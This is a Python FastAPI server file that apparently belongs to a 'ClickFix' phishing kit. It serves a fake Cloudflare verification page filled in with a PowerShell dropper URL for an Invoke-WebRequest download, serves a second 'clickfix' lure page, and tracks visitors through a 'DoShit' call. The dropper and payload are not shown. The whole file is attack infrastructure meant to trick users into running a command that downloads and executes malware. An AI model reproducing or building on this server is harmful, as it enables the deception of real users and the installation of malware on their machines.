from fastapi import FastAPI,Request
from fastapi.responses import FileResponse,HTMLResponse,Response
from do import DoShit
import asyncio
import aiofiles
import config



app = FastAPI()







@app.get("/")
async def root_route(req:Request):
    await DoShit(req).start("now")

    async with aiofiles.open(config.conf["PATHS"]["cloudflare_page"],encoding="utf-8") as f:
        html = await f.read()
    html = html.replace("{{PSScript URL for IWR}}",config.conf["URLS"]["powershell_dropper_url"])
    html = html.replace("{{CLICK_FIX_PAGE}}",config.conf["URLS"]["clickfix_page_endpoint"])
    print(html)
    return HTMLResponse(
      html  
    )

@app.get(f"{config.hookPageEndpoint}")
async def repair(req:Request):
    await DoShit(req).start("now")
    async with aiofiles.open(config.conf["PATHS"]["clickfix_page"],"r") as CFX:
        CFXHtml = await CFX.read()
    return Response(
        content=CFXHtml,
        media_type="text/plain"
    )



if __name__=="__main__":
    import os
    from colorama import init
    init()
    os.system(
        f"uvicorn {config.socialENGServerFile.replace(".py","")}:app --port {config.port} --host 0.0.0.0 --reload"
    )